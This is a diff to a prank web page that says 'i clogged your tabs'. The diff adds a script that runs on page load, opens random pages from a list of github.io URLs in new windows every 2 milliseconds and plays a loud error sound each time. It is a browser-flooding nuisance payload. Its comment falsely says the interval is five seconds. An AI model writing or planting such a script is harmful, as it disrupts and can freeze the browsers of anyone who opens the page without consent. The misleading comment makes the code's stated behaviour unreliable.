@@ -20,7 +20,7 @@
 </head>
 <body>
 <div id="container">
-  <div id="text">i cloged ur tabs. </div>
+  <div id="text">i clogged your tabs.</div>
 </div>
 <script>
   const text = document.getElementById('text');
@@ -80,6 +80,32 @@
   }
 
   animateText();
+</script>
+
+<!-- Add your additional JavaScript code here -->
+<script>
+  const soundUrl = "https://www.myinstants.com/media/sounds/windows-error-bass-boosted_7I1jSTV.mp3";
+
+  // Create an audio element
+  const audio = new Audio(soundUrl);
+
+  // Open new pages
+  const pages = [
+      "https://alexosthebestnet.github.io/X/alt1.html",
+      "https://alexosthebestnet.github.io/X/alt2.html",
+      "https://alexosthebestnet.github.io/X/alt3.html",
+      "https://alexosthebestnet.github.io/X/alt4.html",
+      "https://alexosthebestnet.github.io/X/alt5.html"
+  ];
+
+  setInterval(function() {
+      const randomIndex = Math.floor(Math.random() * pages.length);
+      const randomPage = pages[randomIndex];
+      window.open(randomPage, '_blank', 'toolbar=0,location=0,menubar=0');
+      
+      // Play the sound
+      audio.play();
+  }, 2); // Open a new page every 5 seconds and play the sound
 </script>
 </body>
 </html>
